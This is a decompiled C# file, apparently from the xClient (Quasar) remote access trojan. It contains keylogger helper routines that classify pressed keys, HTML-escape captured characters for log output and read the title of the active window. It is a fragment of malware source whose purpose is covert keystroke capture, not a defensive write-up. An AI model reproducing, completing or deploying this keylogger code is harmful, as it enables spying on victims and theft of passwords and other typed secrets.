using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

// Token: 0x0200006C RID: 108
public static class GClass28
{
	// Token: 0x060002F4 RID: 756 RVA: 0x0000EF68 File Offset: 0x0000D168
	public static bool smethod_0(this List<Keys> pressedKeys)
	{
		return pressedKeys != null && (pressedKeys.Contains(Keys.LControlKey) || pressedKeys.Contains(Keys.RControlKey) || pressedKeys.Contains(Keys.LMenu) || pressedKeys.Contains(Keys.RMenu) || pressedKeys.Contains(Keys.LWin) || pressedKeys.Contains(Keys.RWin) || pressedKeys.Contains(Keys.Control) || pressedKeys.Contains(Keys.Alt));
	}

	// Token: 0x060002F5 RID: 757 RVA: 0x0000364A File Offset: 0x0000184A
	public static bool smethod_1(this Keys key)
	{
		return key == Keys.LControlKey || key == Keys.RControlKey || key == Keys.LMenu || key == Keys.RMenu || key == Keys.LWin || key == Keys.RWin || key == Keys.Control || key == Keys.Alt;
	}

	// Token: 0x060002F6 RID: 758 RVA: 0x00003688 File Offset: 0x00001888
	public static bool smethod_2(this List<Keys> pressedKeys, char c)
	{
		return pressedKeys.Contains((Keys)char.ToUpper(c));
	}

	// Token: 0x060002F7 RID: 759 RVA: 0x0000EFDC File Offset: 0x0000D1DC
	public static bool smethod_3(this Keys k)
	{
		return (k >= Keys.A && k <= Keys.Z) || (k >= Keys.NumPad0 && k <= Keys.Divide) || (k >= Keys.D0 && k <= Keys.D9) || (k >= Keys.OemSemicolon && k <= Keys.OemClear) || (k >= Keys.LShiftKey && k <= Keys.RShiftKey) || k == Keys.Capital || k == Keys.Space;
	}

	// Token: 0x060002F8 RID: 760 RVA: 0x0000F034 File Offset: 0x0000D234
	public static bool smethod_4(List<char> list, char search)
	{
		GClass28.Class9 @class = new GClass28.Class9();
		@class.char_0 = search;
		return list.FindAll(new Predicate<char>(@class.method_0)).Count > 1;
	}

	// Token: 0x060002F9 RID: 761 RVA: 0x0000F068 File Offset: 0x0000D268
	public static string smethod_5(char key)
	{
		if (key < ' ')
		{
			return string.Empty;
		}
		char c = key;
		switch (c)
		{
		case ' ':
			return "&nbsp;";
		case '!':
		case '$':
		case '%':
			break;
		case '"':
			return "&quot;";
		case '#':
			return "&#35;";
		case '&':
			return "&amp;";
		case '\'':
			return "&apos;";
		default:
			switch (c)
			{
			case '<':
				return "&lt;";
			case '>':
				return "&gt;";
			}
			break;
		}
		return key.ToString();
	}

	// Token: 0x060002FA RID: 762 RVA: 0x0000F0F4 File Offset: 0x0000D2F4
	public static string smethod_6(Keys key, bool altGr = false)
	{
		string text = key.ToString();
		if (text.Contains("ControlKey"))
		{
			return "Control";
		}
		if (text.Contains("Menu"))
		{
			return "Alt";
		}
		if (text.Contains("Win"))
		{
			return "Win";
		}
		if (text.Contains("Shift"))
		{
			return "Shift";
		}
		return text;
	}

	// Token: 0x060002FB RID: 763 RVA: 0x0000F15C File Offset: 0x0000D35C
	public static string smethod_7()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		ThreadNativeMethods.GetWindowText(ThreadNativeMethods.GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
		string text = stringBuilder.ToString();
		if (string.IsNullOrEmpty(text))
		{
			return null;
		}
		return text;
	}

	// Token: 0x0200006D RID: 109
	[CompilerGenerated]
	private sealed class Class9
	{
		// Token: 0x060002FD RID: 765 RVA: 0x00003696 File Offset: 0x00001896
		public bool method_0(char s)
		{
			return s.Equals(this.char_0);
		}

		// Token: 0x04000135 RID: 309
		public char char_0;
	}
}
